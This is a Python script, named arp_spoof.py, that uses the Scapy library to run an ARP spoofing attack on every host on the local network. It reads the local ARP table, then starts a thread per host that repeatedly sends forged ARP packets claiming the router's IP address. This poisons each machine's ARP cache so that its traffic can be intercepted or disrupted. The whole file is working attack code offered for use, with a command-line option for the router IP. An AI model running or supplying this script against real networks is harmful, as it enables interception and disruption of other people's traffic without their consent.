import _thread
import os

from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.sendrecv import send


# arp_spoof.py
# this is a simply python program/script that will perform a simple ARP spoof
# attack on all hosts on the local network using the Scapy Python library


def start_arp_spoof(router_ip='172.16.119.1'):
	# get ip addresses of machines on local network
	print("========================================")
	full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
	final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
	final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
	print("LOCAL IPS")
	for res in final_results:
		print("\t- " + str(res))

	# loop through and poison ALL hosts
	spoof = router_ip
	op = 1  # Op code 1 for ARP requests
	for res in final_results:
		arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])
		_thread.start_new_thread(do_arp_spoof, (arp,))


def do_arp_spoof(arp):
	while True:
		send(arp)
		time.sleep(2)


# MAIN ============================================= #

if __name__ == '__main__':
	import optparse

	parser = optparse.OptionParser()

	parser.add_option(
		'-r', '--router-ip', dest='router_ip',
		help='Local network router IP address to bind to')

	options, args = parser.parse_args()

	start_arp_spoof(options.router_ip)
